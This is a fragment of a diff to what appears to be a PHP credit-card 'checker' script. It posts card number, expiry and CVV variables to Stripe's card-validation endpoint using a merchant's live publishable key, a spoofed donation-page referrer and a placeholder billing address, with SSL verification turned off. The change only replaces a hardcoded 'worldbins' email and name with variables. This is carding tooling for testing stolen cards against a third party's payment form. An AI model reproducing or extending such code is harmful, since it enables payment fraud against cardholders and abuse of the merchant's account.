@@ -90,7 +90,7 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'email=worldbins13%40gmail.com&validation_type=card&payment_user_agent=Stripe+Checkout+v3+checkout-manhattan+(stripe.js%2Fa44017d)&referrer=https%3A%2F%2Fwww.jeremynixon.ca%2Fdonate%2F&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[cvc]='.$cvv.'&card[name]=Worldbins&card[address_line1]=Christopher+StreetCoastal+Highway&card[address_city]=New+York&card[address_state]=NY&card[address_zip]=10080&card[address_country]=United+States&time_on_page=368462&guid=5de8767d-7feb-434c-b315-c3315228a77f&muid=7e861fb5-8d24-4a59-92b1-b5c8ca1aca29&sid=5ccd34d8-26ff-4621-a785-9f05551183ec&key=pk_live_fs8tDGN6Gfduz6XOivIUqT8j');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'email='.$email.'&validation_type=card&payment_user_agent=Stripe+Checkout+v3+checkout-manhattan+(stripe.js%2Fa44017d)&referrer=https%3A%2F%2Fwww.jeremynixon.ca%2Fdonate%2F&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[cvc]='.$cvv.'&card[name]='.$name.'&card[address_line1]=Christopher+StreetCoastal+Highway&card[address_city]=New+York&card[address_state]=NY&card[address_zip]=10080&card[address_country]=United+States&time_on_page=368462&guid=5de8767d-7feb-434c-b315-c3315228a77f&muid=7e861fb5-8d24-4a59-92b1-b5c8ca1aca29&sid=5ccd34d8-26ff-4621-a785-9f05551183ec&key=pk_live_fs8tDGN6Gfduz6XOivIUqT8j');
 
 $result = curl_exec($ch);
 
